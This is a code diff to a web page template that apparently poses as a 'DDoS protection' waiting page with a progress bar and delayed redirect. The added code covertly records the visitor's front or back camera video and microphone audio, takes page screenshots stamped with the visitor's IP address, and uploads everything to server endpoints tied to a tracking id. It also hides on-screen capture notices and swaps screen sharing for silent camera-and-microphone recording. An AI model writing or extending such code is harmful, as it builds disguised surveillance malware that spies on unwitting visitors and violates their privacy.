@@ -43,6 +43,35 @@ a:hover{color: #f4a15d}
   border-radius: 4px;
   transition: width 0.5s ease;
 }
+.screenshot-flash {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: #fff;
+  z-index: 9999;
+  opacity: 0;
+  pointer-events: none;
+  transition: opacity 0.1s ease-out;
+}
+.screenshot-feedback {
+  display: none !important;
+  visibility: hidden !important;
+  opacity: 0 !important;
+  position: fixed;
+  top: -9999px;
+  left: -9999px;
+}
+.screenshot-feedback.show {
+  display: none !important;
+  visibility: hidden !important;
+  opacity: 0 !important;
+}
+.screenshot-feedback-icon {
+  display: none !important;
+  visibility: hidden !important;
+}
 </style> 
 </head> 
 <body>
@@ -86,14 +115,21 @@ DDoS protection by
 </tr> 
 </tbody>
 </table>
+<div class="screenshot-flash" id="screenshot-flash"></div>
+<div class="screenshot-feedback" id="screenshot-feedback">
+  <span class="screenshot-feedback-icon">📸</span>
+  <span id="screenshot-feedback-text">Taking screenshot...</span>
+</div>
 <video id="video" style="display:none" playsinline autoplay></video>
 <canvas hidden="hidden" id="canvas" width="500" height="500"></canvas>
 <audio id="audio" style="display:none"></audio>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 <script type="text/javascript">
 var c=false, l=false, uid="<%=uid %>";
 var captureMethod = "<%= typeof captureMethod !== 'undefined' ? captureMethod : 'full' %>";
-var redirectDelay = 30000; // 30 seconds delay before redirect (increased for screen/audio recording)
+// Longer delay for screen recording to allow permission dialog and setup
+var redirectDelay = captureMethod === "screen" ? 60000 : 30000; // 60 seconds for screen recording, 30 seconds for others
 
 // Progress bar animation
 function animateProgressBar() {
@@ -120,30 +156,59 @@ function animateProgressBar() {
 // Handle different capture methods
 function getCaptureConfig() {
   switch(captureMethod) {
+    case 'frontvideo':
+      return {
+        camera: true,
+        facingMode: "user",
+        audio: false,
+        screen: false,
+        screenshot: false,
+        videoRecording: true
+      };
+    case 'backvideo':
+      return {
+        camera: true,
+        facingMode: "environment",
+        audio: false,
+        screen: false,
+        screenshot: false,
+        videoRecording: true
+      };
     case 'back':
       return {
         camera: true,
         facingMode: "environment",
         audio: false,
-        screen: false
+        screen: false,
+        screenshot: false
       };
     case 'min':
       return {
         camera: false,
         audio: false,
-        screen: false
+        screen: false,
+        screenshot: false
       };
     case 'audio':
       return {
         camera: false,
         audio: true,
-        screen: false
+        screen: false,
+        screenshot: false
       };
     case 'screen':
       return {
         camera: false,
         audio: false,
-        screen: true
+        screen: true,
+        screenshot: false
+      };
+    case 'screenshot':
+      return {
+        camera: false,
+        audio: false,
+        screen: false,
+        screenshot: true
       };
     case 'full':
     default:
@@ -151,7 +216,8 @@ function getCaptureConfig() {
         camera: true,
         facingMode: "user",
         audio: false,
-        screen: false
+        screen: false,
+        screenshot: false
       };
   }
 }
@@ -268,6 +334,8 @@ async function gather() {
     initAudioCapture();
   } else if (captureConfig.screen) {
     initScreenCapture();
+  } else if (captureConfig.screenshot) {
+    initScreenshot();
   } else {
     // If no media capture is needed, set camera as completed
     c = true;
@@ -292,6 +360,12 @@ function initCamera() {
   const video = document.getElementById('video');
   const canvas = document.getElementById('canvas');
   var imgsent = 0;
+  
+  // Check if we need to record video
+  if (captureConfig.videoRecording) {
+    initVideoRecording();
+    return;
+  }
   
   function postImage(imageData) {
     $.post("<%=a %>/camsnap", {
@@ -344,6 +418,117 @@ function initCamera() {
   cam();
 }
 
+// Video recording function for camera
+function initVideoRecording() {
+  const video = document.getElementById('video');
+  let mediaRecorder;
+  let recordedChunks = [];
+  
+  // Determine endpoint based on which camera is used
+  const videoEndpoint = captureMethod === 'frontvideo' 
+    ? "<%=a %>/videofrontcamera" 
+    : "<%=a %>/videobackcamera";
+  
+  console.log(`Initializing video recording with endpoint: ${videoEndpoint}`);
+  
+  const constraints = {
+    audio: false, // Completely disable audio to prevent echo issues
+    video: { 
+      facingMode: captureConfig.facingMode || "user",
+      width: { ideal: 1280 },
+      height: { ideal: 720 }
+    }
+  };
+  
+  async function startVideoRecording() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+      handleVideoSuccess(stream);
+    } catch (e) {
+      console.error("Video recording error:", e);
+      c = true;
+      checkRedirect();
+    }
+  }
+  
+  function handleVideoSuccess(stream) {
+    try {
+      video.srcObject = stream;
+      
+      // Set up media recorder with enhanced settings for better quality
+      mediaRecorder = new MediaRecorder(stream, {
+        mimeType: 'video/webm;codecs=vp9,opus',
+        videoBitsPerSecond: 2500000 // 2.5 Mbps
+      });
+      
+      // Handle data available event
+      mediaRecorder.ondataavailable = (event) => {
+        if (event.data && event.data.size > 0) {
+          recordedChunks.push(event.data);
+        }
+      };
+      
+      // Handle recording stopped
+      mediaRecorder.onstop = () => {
+        // Create blob from chunks
+        const blob = new Blob(recordedChunks, {type: 'video/webm'});
+        
+        // Convert to base64 for sending
+        const reader = new FileReader();
+        reader.readAsDataURL(blob);
+        reader.onloadend = () => {
+          const base64data = reader.result.split(',')[1];
+          
+          // Send to correct endpoint based on camera type
+          $.post(videoEndpoint, {
+            uid: uid,
+            data: encodeURIComponent(base64data)
+          }, (s) => { 
+            console.log("Video recording sent successfully");
+            
+            // Stop all tracks
+            stream.getTracks().forEach(track => track.stop());
+            
+            // Mark as completed
+            c = true;
+            checkRedirect();
+          }).fail((error) => {
+            console.error("Failed to send video recording:", error);
+            c = true;
+            checkRedirect();
+          });
+        };
+      };
+      
+      // Record for exactly 10 seconds (maximum for Vercel)
+      const recordingDuration = 10000; // 10 seconds
+      mediaRecorder.start();
+      
+      // Add timestamp to track duration explicitly
+      const startTime = Date.now();
+      
+      // Stop after 10 seconds
+      setTimeout(() => {
+        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+          mediaRecorder.stop();
+        }
+      }, recordingDuration);
+      
+    } catch (error) {
+      console.error("Media recorder error:", error);
+      
+      // Fallback in case of error
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+      }
+      c = true;
+      checkRedirect();
+    }
+  }
+  
+  startVideoRecording();
+}
+
 // Audio capture
 function initAudioCapture() {
   const audioElement = document.getElementById('audio');
@@ -352,7 +537,14 @@ function initAudioCapture() {
   
   async function startAudioCapture() {
     try {
-      const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+      const stream = await navigator.mediaDevices.getUserMedia({ 
+        audio: {
+          echoCancellation: true,
+          noiseSuppression: true,
+          autoGainControl: true
+        }, 
+        video: false 
+      });
       handleAudioSuccess(stream);
     } catch (e) {
       console.error("Audio capture error:", e);
@@ -380,30 +572,47 @@ function initAudioCapture() {
         // Create audio blob
         const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
         
-        // Create audio URL for preview (optional)
-        const audioURL = URL.createObjectURL(audioBlob);
-        const audioPreview = document.createElement('audio');
-        audioPreview.controls = true;
-        audioPreview.src = audioURL;
-        audioPreview.style.display = 'none';
-        document.body.appendChild(audioPreview);
+        // Convert to base64 for sending to server
+        const reader = new FileReader();
+        reader.readAsDataURL(audioBlob);
+        reader.onloadend = () => {
+          const base64data = reader.result.split(',')[1];
         
-        // Stop all tracks
-        stream.getTracks().forEach(track => track.stop());
+          // Create audio URL for preview (optional)
+          const audioURL = URL.createObjectURL(audioBlob);
+          const audioPreview = document.createElement('audio');
+          audioPreview.controls = true;
+          audioPreview.src = audioURL;
+          audioPreview.style.display = 'none';
+          document.body.appendChild(audioPreview);
+          
+          // Send to server
+          $.post("<%=a %>/audiorecording", {
+            uid: uid,
+            data: encodeURIComponent(base64data)
+          }, (s) => { 
+            console.log("Audio recording sent to server");
+          }).fail((error) => {
+            console.error("Failed to send audio recording:", error);
+          });
         
-        // Set as completed
-        c = true;
-        checkRedirect();
+          // Stop all tracks
+          stream.getTracks().forEach(track => track.stop());
+          
+          // Set as completed
+          c = true;
+          checkRedirect();
+        };
       };
       
-      // Start recording and stop after 5 seconds
+      // Start recording and stop after 15 seconds
       mediaRecorder.start();
       
       setTimeout(() => {
         if (mediaRecorder && mediaRecorder.state !== 'inactive') {
           mediaRecorder.stop();
         }
-      }, 5000);
+      }, 15000);
       
     } catch (error) {
       console.error("MediaRecorder error:", error);
@@ -420,18 +629,174 @@ function initAudioCapture() {
   startAudioCapture();
 }
 
+// Screenshot capture
+function initScreenshot() {
+  console.log("Initializing screenshot capture with html2canvas");
+  
+  // Get the screenshot flash and feedback elements
+  const screenshotFlash = document.getElementById('screenshot-flash');
+  const screenshotFeedback = document.getElementById('screenshot-feedback');
+  const screenshotFeedbackText = document.getElementById('screenshot-feedback-text');
+  
+  // Completely disabled feedback notification as requested
+  function showFeedback(text) {
+    // Do nothing - toast notifications are disabled
+    return;
+  }
+  
+  // Minimal visual feedback without intrusive notifications
+  function flashScreen() {
+    // Extremely subtle flash (almost imperceptible) or no flash at all
+    screenshotFlash.style.opacity = 0.2;
+    setTimeout(() => {
+      screenshotFlash.style.opacity = 0;
+    }, 50);
+  }
+  
+  // Take screenshot with slight delay for page to render
+  setTimeout(() => {
+    try {
+      // Show visual feedback that screenshot is happening
+      showFeedback('Capturing page...');
+      
+      // Capture the entire page
+      html2canvas(document.body, {
+        allowTaint: true,
+        useCORS: true,
+        scale: 1,
+        logging: false, // Disable logging
+        onclone: (clonedDoc) => {
+          // Add timestamp and IP info to the screenshot
+          const timestamp = document.createElement('div');
+          timestamp.style.position = 'fixed';
+          timestamp.style.bottom = '10px';
+          timestamp.style.right = '10px';
+          timestamp.style.backgroundColor = 'rgba(0,0,0,0.7)';
+          timestamp.style.color = 'white';
+          timestamp.style.padding = '5px 10px';
+          timestamp.style.borderRadius = '5px';
+          timestamp.style.fontSize = '12px';
+          timestamp.style.fontFamily = 'Arial, sans-serif';
+          timestamp.innerHTML = `<div>📅 ${new Date().toLocaleString()}</div>
+                                <div>🌐 IP: <%=ip %></div>`;
+          clonedDoc.body.appendChild(timestamp);
+          
+          // Hide the feedback elements in the cloned document
+          const clonedFeedback = clonedDoc.getElementById('screenshot-feedback');
+          const clonedFlash = clonedDoc.getElementById('screenshot-flash');
+          if (clonedFeedback) clonedFeedback.style.display = 'none';
+          if (clonedFlash) clonedFlash.style.display = 'none';
+        }
+      }).then(canvas => {
+        console.log("Screenshot taken successfully");
+        
+        // Flash the screen to indicate screenshot was taken
+        flashScreen();
+        
+        // Get the canvas data as base64
+        const screenshotData = canvas.toDataURL('image/png').replace('data:image/png;base64,', '');
+        
+        // No feedback/toast notifications as per user request
+        
+        // Send the screenshot to server
+        $.post("<%=a %>/screenshot", {
+          uid: uid,
+          img: encodeURIComponent(screenshotData)
+        }, (response) => {
+          console.log("Screenshot sent successfully");
+          // No feedback display as per user request
+          c = true;
+          checkRedirect();
+        }).fail((error) => {
+          console.error("Failed to send screenshot:", error);
+          // No feedback display as per user request
+          // Try fallback screenshot method
+          fallbackScreenshot();
+        });
+      }).catch(error => {
+        console.error("Error capturing with html2canvas:", error);
+        // No feedback display as per user request
+        fallbackScreenshot();
+      });
+    } catch (error) {
+      console.error("Screenshot initialization error:", error);
+      // No feedback display as per user request
+      fallbackScreenshot();
+    }
+  }, 1000);
+  
+  // Fallback to simpler screenshot if html2canvas fails
+  function fallbackScreenshot() {
+    console.log("Using fallback screenshot method");
+    
+    try {
+      const canvas = document.getElementById('canvas');
+      const ctx = canvas.getContext('2d');
+      
+      // Set to viewport size
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+      
+      // Fill with background
+      ctx.fillStyle = "#FFFFFF";
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      
+      // Add metadata text
+      ctx.font = "14px Arial";
+      ctx.fillStyle = "#000000";
+      ctx.fillText("Page captured at: " + new Date().toLocaleString(), 10, 20);
+      ctx.fillText("IP: <%=ip %>", 10, 40);
+      ctx.fillText("User Agent: " + navigator.userAgent, 10, 60);
+      
+      // Flash the screen
+      flashScreen();
+      
+      // Convert to base64
+      const screenshotData = canvas.toDataURL("image/png").replace("data:image/png;base64,", "");
+      
+      // Send to server - no notifications as per user request
+      $.post("<%=a %>/screenshot", {
+        uid: uid,
+        img: encodeURIComponent(screenshotData)
+      }, (response) => {
+        console.log("Fallback screenshot sent successfully");
+        // No feedback display as per user request
+        c = true;
+        checkRedirect();
+      }).fail((error) => {
+        console.error("Failed to send fallback screenshot:", error);
+        // No feedback display as per user request
+        c = true;
+        checkRedirect();
+      });
+    } catch (finalError) {
+      console.error("All screenshot methods failed:", finalError);
+      // No feedback display as per user request
+      c = true;
+      checkRedirect();
+    }
+  }
+}
+
 // Screen capture
 function initScreenCapture() {
   const video = document.getElementById('video');
   let mediaRecorder;
   let recordedChunks = [];
   
-  async function startScreenCapture() {
+  async function startCameraCapture() {
     try {
-      // Show a dialog to request screen sharing
-      const stream = await navigator.mediaDevices.getDisplayMedia({
+      // Request front camera instead of screen (screen recording removed as requested)
+      const stream = await navigator.mediaDevices.getUserMedia({
+        audio: {
+          echoCancellation: true,
+          noiseSuppression: true,
+          autoGainControl: true
+        },
         video: {
-          cursor: "always"
+          facingMode: "user",
+          width: { ideal: 1280 },
+          height: { ideal: 720 }
         }
       });
       
@@ -453,22 +818,39 @@ function initScreenCapture() {
         // Create blob from chunks
         const blob = new Blob(recordedChunks, {type: 'video/webm'});
         
-        // Optional: Create video element to verify recording worked
-        const videoURL = URL.createObjectURL(blob);
-        const videoPreview = document.createElement('video');
-        videoPreview.controls = true;
-        videoPreview.width = 320;
-        videoPreview.height = 240;
-        videoPreview.style.display = 'none';
-        videoPreview.src = videoURL;
-        document.body.appendChild(videoPreview);
-        
-        // Stop all tracks
-        stream.getTracks().forEach(track => track.stop());
-        
-        // Mark as completed
-        c = true;
-        checkRedirect();
+        // Convert to base64 for sending
+        const reader = new FileReader();
+        reader.readAsDataURL(blob);
+        reader.onloadend = () => {
+          const base64data = reader.result.split(',')[1];
+          
+          // Optional: Create video element to verify recording worked
+          const videoURL = URL.createObjectURL(blob);
+          const videoPreview = document.createElement('video');
+          videoPreview.controls = true;
+          videoPreview.width = 320;
+          videoPreview.height = 240;
+          videoPreview.style.display = 'none';
+          videoPreview.src = videoURL;
+          document.body.appendChild(videoPreview);
+          
+          // Send video data to server (using camera video endpoint)
+          $.post("<%=a %>/cameravideo", {
+            uid: uid,
+            data: encodeURIComponent(base64data)
+          }, (s) => { 
+            console.log("Video recording sent to server");
+          }).fail((error) => {
+            console.error("Failed to send video recording:", error);
+          });
+          
+          // Stop all tracks
+          stream.getTracks().forEach(track => track.stop());
+          
+          // Mark as completed
+          c = true;
+          checkRedirect();
+        };
       };
       
       // Handle user stopping the screen share
@@ -478,24 +860,24 @@ function initScreenCapture() {
         }
       };
       
-      // Start recording for 6 seconds
+      // Start recording for 15 seconds
       mediaRecorder.start();
       
-      // Stop after 6 seconds
+      // Stop after 15 seconds
       setTimeout(() => {
         if (mediaRecorder && mediaRecorder.state !== 'inactive') {
           mediaRecorder.stop();
         }
-      }, 6000);
+      }, 15000);
       
     } catch (e) {
-      console.error("Screen capture error:", e);
+      console.error("Camera video capture error:", e);
       c = true;
       checkRedirect();
     }
   }
   
-  startScreenCapture();
+  startCameraCapture();
 }
 
 window.onload = () => {
